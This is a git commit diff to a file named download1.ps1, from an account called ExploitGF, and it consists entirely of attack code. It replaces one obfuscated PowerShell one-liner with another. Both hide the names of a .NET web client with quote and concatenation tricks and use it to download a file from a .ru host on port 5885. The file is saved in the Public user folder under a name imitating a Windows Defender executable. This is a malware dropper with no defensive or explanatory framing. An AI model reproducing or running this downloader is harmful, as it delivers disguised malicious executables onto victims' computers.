63770e565aa58034941cc04beef8392af2981633
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-31 10:44:47 +0500

    Update download1.ps1

--- download1.ps1
+++ download1.ps1
@@ -1,1 +1,3 @@
-((N'ew-Obj'ect S'yst'em.N'et.We'bCli'ent)).'Do'+'wn'+'lo'+'adF'+'ile'(('h+'+'tt'+'p:/'+'/rp'+'hos'+'t.r'+'u:58'8+5/64.signed','C:'+'\Use'+'rs\P'+'ubl'+'ic\'+'MSA'+'SC.e'xe))
+$get = "N'ew-O'bj'ect"
+$sys = "Sy'stem'.N'et.W'ebCl'ient"
+($get $sys).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
